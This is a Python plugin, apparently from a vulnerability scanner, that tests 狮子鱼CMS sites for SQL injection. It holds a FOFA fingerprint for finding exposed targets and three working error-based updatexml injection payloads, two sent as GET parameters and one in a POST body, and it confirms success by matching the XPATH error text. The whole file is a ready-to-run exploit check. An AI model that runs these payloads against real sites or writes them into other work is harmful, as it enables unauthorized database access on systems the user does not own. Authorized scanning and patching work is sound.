#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/zHCae99fwLqitX1QIZkYmQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '狮子鱼CMS sql注入',

      'level'     :   'high',

      'FOFA'      :   'body="/seller.php?s=/Public/login"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2023/11/27',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  url1 = url + '/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)'
  url2 = url + '/index.php?s=/Utility/file&do=image&groupid=123)%20or%20updatexml(1,concat(0x7e,user(),0x7e),1)--+'
  url3 = url + '/index.php?s=/Scekill/load_gps_goodslist'
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if re.search(r'XPATH.*?syntax.*?error.*?@',res.text,re.S):
      # ret['huixian'] = res.text
      ret['url'] = url1
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if re.search(r'XPATH.*?syntax.*?error.*?@',res.text,re.S):
      # ret['huixian'] = res.text
      ret['url'] = url1
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass

  try:
    data = 'gid=1229) or updatexml(1,concat(0x7e,user(),0x7e),1)--+'
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    res=requests.post(url=url3,headers=headers,data=data,timeout=5,verify=False)
    if re.search(r'XPATH.*?syntax.*?error.*?@',res.text,re.S):
      # ret['huixian'] = res.text
      ret['url'] = url1
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret